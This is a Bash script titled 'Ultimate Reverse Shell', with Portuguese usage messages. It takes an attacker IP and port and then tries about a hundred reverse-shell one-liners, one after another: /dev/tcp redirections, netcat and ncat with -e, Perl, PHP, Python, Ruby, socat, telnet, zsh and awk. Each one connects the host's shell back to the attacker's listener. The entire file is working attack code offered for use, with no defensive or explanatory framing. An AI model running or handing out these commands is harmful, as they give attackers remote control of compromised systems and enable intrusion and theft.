#!/bin/bash

if [ $# -ne 2 ]; then
	echo " "
	echo " _- Ultimate Reverse Shell -_"
	echo " "
	echo " [!] Necessario informar IP e Porta que"
	echo "     receberá a shell reversa."
	echo " "
	echo " Exemplo:"
	echo " $0 192.168.0.10 4444"
	exit 1
fi

ATKIP=$1
ATKPORT=$2

echo " "
echo " _- Ultimate Reverse Shell -_"
echo " "
echo " Tentando shell reversa com $1:$2"
echo " "

sh -i >& /dev/tcp/$ATKIP/$ATKPORT 0>&1
/bin/sh -i >& /dev/tcp/$ATKIP/$ATKPORT 0>&1
bash -i >& /dev/tcp/$ATKIP/$ATKPORT 0>&1
/bin/bash -i >& /dev/tcp/$ATKIP/$ATKPORT 0>&1
sh -c 'sh -i >& /dev/tcp/$ATKIP/$ATKPORT 0>&1'
/bin/sh -c '/bin/sh -i >& /dev/tcp/$ATKIP/$ATKPORT 0>&1'
bash -c 'bash -i >& /dev/tcp/$ATKIP/$ATKPORT 0>&1'
/bin/bash -c '/bin/bash -i >& /dev/tcp/$ATKIP/$ATKPORT 0>&1'
0<&196;exec 196<>/dev/tcp/$ATKIP/$ATKPORT; sh <&196 >&196 2>&196
0<&196;exec 196<>/dev/tcp/$ATKIP/$ATKPORT; /bin/sh <&196 >&196 2>&196
0<&196;exec 196<>/dev/tcp/$ATKIP/$ATKPORT; bash <&196 >&196 2>&196
0<&196;exec 196<>/dev/tcp/$ATKIP/$ATKPORT; /bin/bash <&196 >&196 2>&196
exec 5<>/dev/tcp/$ATKIP/$ATKPORT;cat <&5 | while read line; do $line 2>&5 >&5; done
sh -i 5<> /dev/tcp/$ATKIP/$ATKPORT 0<&5 1>&5 2>&5
/bin/sh -i 5<> /dev/tcp/$ATKIP/$ATKPORT 0<&5 1>&5 2>&5
bash -i 5<> /dev/tcp/$ATKIP/$ATKPORT 0<&5 1>&5 2>&5
/bin/bash -i 5<> /dev/tcp/$ATKIP/$ATKPORT 0<&5 1>&5 2>&5
nc $ATKIP $ATKPORT -e sh
nc $ATKIP $ATKPORT -e /bin/sh
nc $ATKIP $ATKPORT -e bash
nc $ATKIP $ATKPORT -e /bin/bash
nc -c sh $ATKIP $ATKPORT
nc -c /bin/sh $ATKIP $ATKPORT
nc -c bash $ATKIP $ATKPORT
nc -c /bin/bash $ATKIP $ATKPORT
ncat $ATKIP $ATKPORT -e sh
ncat $ATKIP $ATKPORT -e /bin/sh
ncat $ATKIP $ATKPORT -e bash
ncat $ATKIP $ATKPORT -e /bin/bash
perl -e 'use Socket;$i="$ATKIP";$p=$ATKPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
perl -e 'use Socket;$i="$ATKIP";$p=$ATKPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -e 'use Socket;$i="$ATKIP";$p=$ATKPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'
perl -e 'use Socket;$i="$ATKIP";$p=$ATKPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"$ATKIP:$ATKPORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
php -r '$sock=fsockopen("$ATKIP",$ATKPORT);exec("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$ATKIP",$ATKPORT);exec("/bin/sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$ATKIP",$ATKPORT);exec("bash <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$ATKIP",$ATKPORT);exec("/bin/bash <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$ATKIP",$ATKPORT);shell_exec("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$ATKIP",$ATKPORT);shell_exec("/bin/sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$ATKIP",$ATKPORT);shell_exec("bash <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$ATKIP",$ATKPORT);shell_exec("/bin/bash <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$ATKIP",$ATKPORT);system("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$ATKIP",$ATKPORT);system("/bin/sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$ATKIP",$ATKPORT);system("bash <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$ATKIP",$ATKPORT);system("/bin/bash <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$ATKIP",$ATKPORT);passthru("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$ATKIP",$ATKPORT);passthru("/bin/sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$ATKIP",$ATKPORT);passthru("bash <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$ATKIP",$ATKPORT);passthru("/bin/bash <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$ATKIP",$ATKPORT);`sh <&3 >&3 2>&3`;'
php -r '$sock=fsockopen("$ATKIP",$ATKPORT);`/bin/sh <&3 >&3 2>&3`;'
php -r '$sock=fsockopen("$ATKIP",$ATKPORT);`bash <&3 >&3 2>&3`;'
php -r '$sock=fsockopen("$ATKIP",$ATKPORT);`/bin/bash <&3 >&3 2>&3`;'
php -r '$sock=fsockopen("$ATKIP",$ATKPORT);popen("sh <&3 >&3 2>&3", "r");'
php -r '$sock=fsockopen("$ATKIP",$ATKPORT);popen("/bin/sh <&3 >&3 2>&3", "r");'
php -r '$sock=fsockopen("$ATKIP",$ATKPORT);popen("bash <&3 >&3 2>&3", "r");'
php -r '$sock=fsockopen("$ATKIP",$ATKPORT);popen("/bin/bash <&3 >&3 2>&3", "r");'
php -r '$sock=fsockopen("$ATKIP",$ATKPORT);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
php -r '$sock=fsockopen("$ATKIP",$ATKPORT);$proc=proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
php -r '$sock=fsockopen("$ATKIP",$ATKPORT);$proc=proc_open("bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
php -r '$sock=fsockopen("$ATKIP",$ATKPORT);$proc=proc_open("/bin/bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
export RHOST="$ATKIP";export RPORT=$ATKPORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
export RHOST="$ATKIP";export RPORT=$ATKPORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
export RHOST="$ATKIP";export RPORT=$ATKPORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
export RHOST="$ATKIP";export RPORT=$ATKPORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ATKIP",$ATKPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ATKIP",$ATKPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ATKIP",$ATKPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ATKIP",$ATKPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
export RHOST="$ATKIP";export RPORT=$ATKPORT;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
export RHOST="$ATKIP";export RPORT=$ATKPORT;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
export RHOST="$ATKIP";export RPORT=$ATKPORT;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
export RHOST="$ATKIP";export RPORT=$ATKPORT;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ATKIP",$ATKPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ATKIP",$ATKPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ATKIP",$ATKPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ATKIP",$ATKPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("$ATKIP",$ATKPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("$ATKIP",$ATKPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("$ATKIP",$ATKPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("$ATKIP",$ATKPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("$ATKIP",$ATKPORT))'
ruby -rsocket -e'spawn("/bin/sh",[:in,:out,:err]=>TCPSocket.new("$ATKIP",$ATKPORT))'
ruby -rsocket -e'spawn("bash",[:in,:out,:err]=>TCPSocket.new("$ATKIP",$ATKPORT))'
ruby -rsocket -e'spawn("/bin/bash",[:in,:out,:err]=>TCPSocket.new("$ATKIP",$ATKPORT))'
ruby -rsocket -e'exit if fork;c=TCPSocket.new("$ATKIP","$ATKPORT");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
socat TCP:$ATKIP:$ATKPORT EXEC:sh
socat TCP:$ATKIP:$ATKPORT EXEC:/bin/sh
socat TCP:$ATKIP:$ATKPORT EXEC:bash
socat TCP:$ATKIP:$ATKPORT EXEC:/bin/bash
socat TCP:$ATKIP:$ATKPORT EXEC:'sh',pty,stderr,setsid,sigint,sane
socat TCP:$ATKIP:$ATKPORT EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane
socat TCP:$ATKIP:$ATKPORT EXEC:'bash',pty,stderr,setsid,sigint,sane
socat TCP:$ATKIP:$ATKPORT EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
TF=$(mktemp -u);mkfifo $TF && telnet $ATKIP $ATKPORT 0<$TF | sh 1>$TF
TF=$(mktemp -u);mkfifo $TF && telnet $ATKIP $ATKPORT 0<$TF | /bin/sh 1>$TF
TF=$(mktemp -u);mkfifo $TF && telnet $ATKIP $ATKPORT 0<$TF | bash 1>$TF
TF=$(mktemp -u);mkfifo $TF && telnet $ATKIP $ATKPORT 0<$TF | /bin/bash 1>$TF
zsh -c 'zmodload zsh/net/tcp && ztcp $ATKIP $ATKPORT && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
awk 'BEGIN {s = "/inet/tcp/0/$ATKIP/$ATKPORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
